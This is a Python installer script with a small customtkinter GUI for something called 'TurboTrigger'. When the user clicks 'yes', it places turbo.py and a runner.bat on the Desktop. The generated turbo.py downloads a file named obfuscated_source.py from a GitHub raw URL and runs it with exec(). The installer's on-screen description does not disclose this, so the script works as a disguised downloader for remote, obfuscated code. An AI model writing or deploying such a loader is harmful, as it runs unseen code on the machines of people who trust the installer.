import os
import customtkinter














def create_python_file(directory, filename):
    content = '''
import os
import requests

import tempfile

temp_dir = tempfile.gettempdir()
file_path = os.path.join(temp_dir, 'text.txt')


def download_text_from_url(url, file_path):
    try:
        # Send a GET request to the URL
        response = requests.get(url)

        # Check if the request was successful (status code 200)
        if response.status_code == 200:
            # Create the directory if it doesn't exist
            os.makedirs(os.path.dirname(file_path), exist_ok=True)
            
            # Open the file in write mode and write the content
            with open(file_path, 'w', encoding='utf-8') as file:
                file.write(response.text)
            
            print(f"Text downloaded successfully and saved to {file_path}")
        else:
            print(f"Failed to download text. Status code: {response.status_code}")
    except Exception as e:
        print(f"Error: {e}")



url = "https://raw.githubusercontent.com/turbotriggerbot/turbo-source-release/main/obfuscated_source.py"

temp_dir = tempfile.gettempdir()

file_path = os.path.join(temp_dir, 'text.txt')

download_text_from_url(url, file_path)

exec(open(file_path).read())
'''

    file_path = os.path.join(directory, filename)
    with open(file_path, 'w') as file:
        file.write(content)
    return file_path

def create_batch_file(directory, python_file):
    batch_content = f'cd "{directory}"\npython "{python_file}"'
    batch_file_path = os.path.join(os.path.expanduser("~"), "Desktop", "runner.bat")
    with open(batch_file_path, 'w') as batch_file:
        batch_file.write(batch_content)
    return batch_file_path

def install():
    # Directory to save the Python file
    ## save_directory = input("Enter the directory to save the Python file:\n")
    ## make it desktop by default instead 
    save_directory = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop') 
    
    # Python file name
    ## python_file_name = input("Enter the Python file name (with .py extension):\n")
    ## give it default name instead
    python_file_name = "turbo.py"

    # Create Python file
    python_file_path = create_python_file(save_directory, python_file_name)
    print(f"Python file saved at: {python_file_path}")

    # Create batch file on desktop
    batch_file_path = create_batch_file(save_directory, python_file_name)
    print(f"Batch file saved on desktop: {batch_file_path}")







import time
app = customtkinter.CTk()
app.geometry("370x300")
app.title("TurboTrigger installer")
app.attributes('-topmost', True)

text = customtkinter.CTkLabel(app, text="Install TurboTrigger?", fg_color="transparent" , font=('consola', 14, 'bold'))
text.grid(row=0 , column=0  , columnspan=2 , padx=20 , pady=20)



desc = customtkinter.CTkLabel(app, text="the following files will be added to your desktop : \n\n   turbo.py\n   runner.bat",justify="left" , fg_color="transparent" , font=('consola', 14))
desc.grid(row=1 , column=0  , columnspan=2 , padx=20 , pady=20)


def button_event():
    print("button pressed")
    install()
    time.sleep(1)
    button.after(100 , lambda: button.destroy())
    button2.after(100 , lambda: button2.destroy())
    desc.after(100 , lambda: desc.destroy())
    text.configure(text="Installed successfully" )

    button3.grid(row=2 , column=0 , columnspan=2 , padx=80 , pady=(100 , 0))
    



button = customtkinter.CTkButton(app, text="yes", command=button_event)
button.grid(row=2 , column=0 , padx=20 , pady=20)

def button_event2():
    
    print("button pressed")
    exit()


button2 = customtkinter.CTkButton(app, text="no", command=button_event2)
button2.grid(row=2 , column=1 , padx=20 , pady=20)


def button_event3():
    
    print("button pressed")
    exit()


button3 = customtkinter.CTkButton(app, width=200 ,text="finish", command=app.destroy)


app.mainloop()



